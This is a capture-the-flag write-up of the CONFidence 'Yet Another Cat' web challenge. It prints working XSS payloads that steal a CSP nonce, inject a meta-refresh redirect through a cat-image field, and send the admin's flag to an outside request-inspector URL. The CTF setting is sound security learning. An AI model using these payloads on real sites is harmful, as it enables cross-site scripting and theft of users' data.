---
layout: post
title: "CONFidenceCTF Yet Another Cat solution"
date: 2020-09-06
---

The challenge' info card gives us a link to the website.

#### Info card:

![infocard](/assets/posts/Confidence-yac/images/p1.PNG)


#### Main page:


![mainpage](/assets/posts/Confidence-yac/images/p2.PNG)


We can create a note and report it to the admin.
There is a pseudo flag on our main page which is taken from `/flag?var=flag`.

#### /flag?var=flag :


![flagoutput](/assets/posts/Confidence-yac/images/p3.PNG)


`/flag?var=flag` returns a valid javascript line so we shouldn't use XHR (we also can't use XHR because of the CSP).
We can just use the `/flag?var=flag` as a script source and access the flag through `window.flag`.
The technique uses in `/flag` is simillar to JSONP, you can read about it here: [jsonp](https://www.w3schools.com/js/js_json_jsonp.asp).

Let's take a look at the CSP on this website :

#### CSP:


![CSP](/assets/posts/Confidence-yac/images/p4.PNG)


Due to the Content-Security-Policy header, only script tag with valid nonce or script from https://ww.google.com/recaptcha and https://www.gstatic.com/recaptcha/ will be loaded.

For achieving XSS we should inject our script to an existing script tag or find a way to steal the nonce value.

#### Note creation screen:


![notecreate](/assets/posts/Confidence-yac/images/p5.PNG)


The content of the note is well escaped with HTML entities encoding so we can't inject HTML.

After creating a note there is a theme choosing functionality.
The theme name reflects within a script tag, so we can inject arbitrary javascript to this tag: 

#### The theme name within the source code:


![themeFirst](/assets/posts/Confidence-yac/images/p6.PNG)


#### Javascript injection after the theme:


![themeinjection](/assets/posts/Confidence-yac/images/p7.PNG)


We can't just fetch the flag because of the Content-Security-Policy (`default-src 'none'`) so we should use our XSS to steal the nonce value, create a script tag with the stolen nonce which its source is `/flag?var=flag`.
After creating this script tag, window.flag will contain the value of the flag.
I couldn't use any quotation marks because they were encoded as HTML entities so I used the location.hash for creating some strings.
We can steal the nonce value with :

`document.scripts[0].nonce`

Here is my payload to write into the DOM two script tags, one for creating the `window.flag` variable and the second for alerting its value, both contain the stolen `nonce` attribute:


`http://yacc.zajebistyc.tf/note/a6f7a8f5-f0b4-4fac-85cc-c02d5a41c93e?theme=blackTheme;document.write(decodeURIComponent(location.hash.slice(1,19)%2bdocument
.scripts[0].nonce%2blocation.hash.slice(25,87)%2blocation.hash.slice(1,19)%2bdocument
.scripts[0].nonce%2blocation.hash.slice(87)));//#%3Cscript%20nonce=script%20src=http://yacc.zajebistyc.tf/flag?var=flag%3E%3C/script%3E%3Ealert(window.flag)%3C/script%3E`


#### Result:


![alertFlag](/assets/posts/Confidence-yac/images/p8.PNG)


#### DOM after the XSS:


![domafterXSS](/assets/posts/Confidence-yac/images/p9.PNG)


Instead of making an alert with the flag value, we can redirect the victim to our `requestinspector` URL with the following javascript code:

`location = "https://requestinspector.com/inspect/<your requestinspectorID>?flag="+window.flag;`

The reporting functionality doesn't allow us to add the query parameter `theme`, so to achieve the XSS attack, we should find a way to redirect the admin to another note, with the theme parameter containing our payload.

The note creation functionality allows us to pick a cat picture URL which is reflected in a script tag and stored on the page. 

#### Note creation request:


![note_req](/assets/posts/Confidence-yac/images/p10.PNG)


#### Cat image path reflection:


![catPath](/assets/posts/Confidence-yac/images/p11.PNG)


If we will set the cat_url to `</script>`, the browser will treat it as the end of the current script tag because the triangular brackets aren't escaped.
After closing the script tag we can inject an arbitrary HTML tag.

#### HTML injection request :


![htmlinjection_req](/assets/posts/Confidence-yac/images/p12.PNG)


#### HTML injection result:


![htmlinjection_result](/assets/posts/Confidence-yac/images/p13.PNG)



We can't inject script tags because the CSP nonce, but we can inject a meta tag which will redirect to our reflected XSS page with the `theme` parameter.

The meta tag for making redirection is :

`<meta http-equiv="Refresh" content="0;url='<url here>'"/>`


#### Last payload :


```
cat_url=</script><meta http-equiv="Refresh" content="0; url='http%3A%2F%2Fyacc.zajebistyc.tf%2Fnote%2Fa8286105-8bf3-4de8-bc65-f195a9d11aaf%3Ftheme%3DblackTheme%3Bdocument.write(decodeURIComponent(location.hash.slice(1%2C19)%252bdocument.scripts%5B0%5D
.nonce%252blocation.hash.slice(25%2C87)%252blocation.hash.slice(1%2C19)%252bdocument.scripts%5B0%5D.nonce%252blocation.hash.slice(87)))
%3B%2F%2F%23%253Cscript%2520nonce%3Dscript%2520src%3Dhttp%3A%2F%2Fyacc.zajebistyc.tf%2Fflag%3Fvar%3Dflag%253E%253C%2Fscript%253E%253Elocation
.href%3D'https%3A%2F%2Frequestinspector.com%2Finspect%2F01ehfz06c7pt6dbcwcy51n7trb%3Fflag%3D'%252bencodeURIComponent(window.flag)%3B%253C%2Fscript%253E'" />
```


#### Request:


![lastpayload](/assets/posts/Confidence-yac/images/p14.PNG)


Sharing the new note will cause the admin to send us the flag:

#### Share:


![share](/assets/posts/Confidence-yac/images/p15.PNG)


#### Flag:


![flag](/assets/posts/Confidence-yac/images/p16.PNG)

